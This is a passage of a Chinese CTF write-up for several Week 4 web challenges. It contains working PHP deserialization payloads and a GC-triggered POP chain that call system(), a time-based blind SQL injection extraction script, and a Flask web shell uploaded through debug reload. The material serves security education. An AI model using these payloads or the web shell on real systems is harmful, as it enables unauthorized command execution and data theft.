&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; O:7:&amp;quot;GetFlag&amp;quot;:2:{s:3:&amp;quot;key&amp;quot;;s:96:&amp;quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&amp;quot;;s:3:&amp;quot;cmd&amp;quot;;s:4:&amp;quot;ls &#x2F;&amp;quot;;}&amp;quot;;s:3:&amp;quot;cmd&amp;quot;;s:6:&amp;quot;whoami&amp;quot;;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;构造 Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&amp;quot;;s:3:&amp;quot;cmd&amp;quot;;s:4:&amp;quot;ls &#x2F;&amp;quot;;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;即可输出跟目录的内容，同理构造 Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&amp;quot;;s:3:&amp;quot;cmd&amp;quot;;s:9:&amp;quot;cat &#x2F;flag&amp;quot;;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;即可得到 flag。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;week-4-more-fast&quot;&gt;[Week 4]More Fast&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-4-more-fast&quot; aria-label=&quot;Anchor link for: week-4-more-fast&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;GC 回收&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Start{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $errMsg;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __destruct() {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        die($this-&amp;gt;errMsg);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Pwn{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $obj;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __invoke(){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $this-&amp;gt;obj-&amp;gt;evil();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function evil() {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        phpinfo();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Reverse{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $func;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __get($var) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ($this-&amp;gt;func)();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Web{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $func;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $var;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function evil() {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if(!preg_match(&amp;quot;&#x2F;flag&#x2F;i&amp;quot;,$this-&amp;gt;var)){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            ($this-&amp;gt;func)($this-&amp;gt;var);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }else{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            echo &amp;quot;Not Flag&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Crypto{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $obj;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __toString() {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $wel = $this-&amp;gt;obj-&amp;gt;good;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return &amp;quot;NewStar&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Misc{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function evil() {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        echo &amp;quot;good job but nothing&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$a = @unserialize($_POST[&amp;#39;fast&amp;#39;]);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;throw new Exception(&amp;quot;Nope&amp;quot;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;在PHP中，使用 &lt;code&gt;引用计数&lt;&#x2F;code&gt; 和 &lt;code&gt;回收周期&lt;&#x2F;code&gt; 来自动管理内存对象的，当一个变量被设置为 &lt;code&gt;NULL&lt;&#x2F;code&gt; ，或者没有任何指针指向 时，它就会被变成垃圾，被 &lt;code&gt;GC&lt;&#x2F;code&gt; 机制自动回收掉 那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被 &lt;code&gt;GC&lt;&#x2F;code&gt; 机制回收，在回收的过程中，它会自动触发 &lt;code&gt;_destruct&lt;&#x2F;code&gt; 方法，而这也就是我们绕过抛出异常的关键点。&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;11843&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;当 Unserialize 运行失败时，则会对运行中的已经创建出来的类进行销毁，提前触发 __destruct 函数。&lt;&#x2F;p&gt;
&lt;p&gt;触发 GC 机制的方法：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;对象被 unset() 函数处理；&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;数组对象为 NULL 。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;show_source(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class B {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  function __destruct() {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    global $flag;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    echo $flag;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$a=array(new B,0);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;echo serialize($a);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; a:2:{i:0;O:1:&amp;quot;B&amp;quot;:0:{}i:1;i:0;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; 数组:长度为2::{int型:长度0;类:长度为1:类名为&amp;quot;B&amp;quot;:值为0 int型:值为1：int型;值为0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;将第二个索引值设为空 ，就可以触发 GC 回收机制。&lt;&#x2F;p&gt;
&lt;p&gt;POP 链如下：&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Start::__destruct()-&amp;gt;Crypto::__toString()-&amp;gt;Reverse::__get($var)-&amp;gt;Pwn::__invoke()-&amp;gt;Web::evil()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$p = new Pwn();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$p-&amp;gt;obj = new Web;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$p-&amp;gt;obj-&amp;gt;func = &amp;quot;system&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$p-&amp;gt;obj-&amp;gt;var = &amp;quot;ls &#x2F;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$r = new Reverse();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$r-&amp;gt;func = $p;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$c = new Crypto();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$c-&amp;gt;obj = $r;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$s = new Start();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$s-&amp;gt;errMsg = $c;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$a = array($s, 0);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;echo serialize($a);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; a:2:{i:0;O:5:&amp;quot;Start&amp;quot;:1:{s:6:&amp;quot;errMsg&amp;quot;;O:6:&amp;quot;Crypto&amp;quot;:1:{s:3:&amp;quot;obj&amp;quot;;O:7:&amp;quot;Reverse&amp;quot;:1:{s:4:&amp;quot;func&amp;quot;;O:3:&amp;quot;Pwn&amp;quot;:1:{s:3:&amp;quot;obj&amp;quot;;O:3:&amp;quot;Web&amp;quot;:2:{s:4:&amp;quot;func&amp;quot;;s:6:&amp;quot;system&amp;quot;;s:3:&amp;quot;var&amp;quot;;s:4:&amp;quot;ls &#x2F;&amp;quot;;}}}}}i:1;i:0;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过将第二个索引 &lt;code&gt;i:1&lt;&#x2F;code&gt; 修改为 &lt;code&gt;i:0&lt;&#x2F;code&gt; 即可出发 GC 回收机制，构造 Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;fast=a:2:{i:0;O:5:&amp;quot;Start&amp;quot;:1:{s:6:&amp;quot;errMsg&amp;quot;;O:6:&amp;quot;Crypto&amp;quot;:1:{s:3:&amp;quot;obj&amp;quot;;O:7:&amp;quot;Reverse&amp;quot;:1:{s:4:&amp;quot;func&amp;quot;;O:3:&amp;quot;Pwn&amp;quot;:1:{s:3:&amp;quot;obj&amp;quot;;O:3:&amp;quot;Web&amp;quot;:2:{s:4:&amp;quot;func&amp;quot;;s:6:&amp;quot;system&amp;quot;;s:3:&amp;quot;var&amp;quot;;s:4:&amp;quot;ls &#x2F;&amp;quot;;}}}}}i:0;i:0;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;即可得到目录，再构造 Payload 如下即可得到 flag 。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;fast=a:2:{i:0;O:5:&amp;quot;Start&amp;quot;:1:{s:6:&amp;quot;errMsg&amp;quot;;O:6:&amp;quot;Crypto&amp;quot;:1:{s:3:&amp;quot;obj&amp;quot;;O:7:&amp;quot;Reverse&amp;quot;:1:{s:4:&amp;quot;func&amp;quot;;O:3:&amp;quot;Pwn&amp;quot;:1:{s:3:&amp;quot;obj&amp;quot;;O:3:&amp;quot;Web&amp;quot;:2:{s:4:&amp;quot;func&amp;quot;;s:6:&amp;quot;system&amp;quot;;s:3:&amp;quot;var&amp;quot;;s:7:&amp;quot;cat &#x2F;f*&amp;quot;;}}}}}i:0;i:0;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-4-midsql&quot;&gt;[Week 4]midsql&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-4-midsql&quot; aria-label=&quot;Anchor link for: week-4-midsql&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$cmd = &amp;quot;select name, price from items where id = &amp;quot;.$_REQUEST[&amp;quot;id&amp;quot;];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$result = mysqli_fetch_all($result);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$result = $result[0];
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;经过尝试无论输入什么正确的都只会回显 &lt;code&gt;你不会以为我真的会告诉你结果吧&lt;&#x2F;code&gt; ，猜测需要进行盲注，先通过构造不同的 Payload 判断哪些被进行了过滤需要进行绕过。&lt;&#x2F;p&gt;
&lt;p&gt;经过测试，空格、等号被绕过了，可以通过 &lt;code&gt;&#x2F;**&#x2F;&lt;&#x2F;code&gt; 和 &lt;code&gt;like&lt;&#x2F;code&gt; 进行绕过。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import time
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import socket
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import requests
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import requests.packages.urllib3.util.connection as urllib3_conn
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;urllib3_conn.allowed_gai_family = lambda: socket.AF_INET
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;session = requests.Session()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def getDatabase():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    results = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(1, 1000):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(f&amp;#39;{i}...&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        start = -1 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        end = 255
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        mid = -1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        while start &amp;lt; end:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            mid = (start + end) &#x2F;&#x2F; 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            url = &amp;quot;http:&#x2F;&#x2F;c968b372-387a-4e4b-b157-b99e627c3a66.node5.buuoj.cn:81&#x2F;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            params = {&amp;quot;id&amp;quot;: f&amp;quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;if(ascii(substr(database(),{i},1))&amp;gt;{mid},sleep(1),1)#&amp;quot;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            ret = session.get(url, params=params)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            assert ret.status_code == 200, f&amp;#39;code: {ret.status_code}&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            assert &amp;#39;429 Too Many Requests&amp;#39; not in ret.text
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            if ret.elapsed.total_seconds() &amp;gt;= 1:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                start = mid + 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                end = mid
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            time.sleep(0.05)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if mid == -1:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            break
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        results.append(chr(start))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(&amp;#39;&amp;#39;.join(results))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return &amp;#39;&amp;#39;.join(results)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;begin = time.time()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;getDatabase()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(f&amp;#39;time spend: {time.time() - begin}&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;1...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;2...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ct
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;3...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ctf
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;4...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;time spend: 16.405414819717407
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得出数据库名为 &lt;code&gt;ctf&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;params = {&amp;quot;id&amp;quot;: f&amp;quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;if(ascii(substr((select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;&amp;#39;ctf&amp;#39;),{i},1))&amp;gt;{mid},sleep(1),1)#&amp;quot;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得出表名为 &lt;code&gt;items&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;params = {&amp;quot;id&amp;quot;: f&amp;quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;if(ascii(substr((select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;&amp;#39;ctf&amp;#39;&#x2F;**&#x2F;and&#x2F;**&#x2F;table_name&#x2F;**&#x2F;like&amp;#39;items&amp;#39;),{i},1))&amp;gt;{mid},sleep(1),1)#&amp;quot;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得出字段名为 &lt;code&gt;id,name,price&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;params = {&amp;quot;id&amp;quot;: f&amp;quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;if(ascii(substr((select&#x2F;**&#x2F;group_concat(id,name,price)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctf.items),{i},1))&amp;gt;{mid},sleep(1),1)#&amp;quot;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得出值 &lt;code&gt;1lolita1000,520lolita&#x27;s flag is flag{647190d8-7511-4386-b513-15440eb033be}1688&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;week-4-flask-disk&quot;&gt;[Week 4]Flask Disk&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-4-flask-disk&quot; aria-label=&quot;Anchor link for: week-4-flask-disk&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;根据题目已知框架为 Flask ，通过 &lt;code&gt;admin manage&lt;&#x2F;code&gt; 已知开启了 Debug 模式，在该模式下修改 &lt;code&gt;app.py&lt;&#x2F;code&gt; 会立即加载，通过 Upload 上传新的 &lt;code&gt;app.py&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from flask import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import os
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;app = Flask(__name__)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;@app.route(&amp;#39;&#x2F;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def index():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    try:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        cmd = request.args.get(&amp;#39;1&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        data = os.popen(cmd).read()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return data
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    except:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        pass
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return &amp;quot;1&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if __name__ == &amp;#39;__main__&amp;#39;:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    app.run(host=&amp;#39;0.0.0.0&amp;#39;,port=5000,debug=True)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;上传后通过构造 Payload 获得 flag 。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;1=cat &#x2F;flag
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-4-pharone&quot;&gt;[Week 4]PharOne&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-4-pharone&quot; aria-label=&quot;Anchor link for: week-4-pharone&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;查看源代码可以发现提示 &lt;code&gt;class.php&lt;&#x2F;code&gt; ，通过查看可以得到源码如下。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Flag{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $cmd;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __destruct()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        @exec($this-&amp;gt;cmd);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
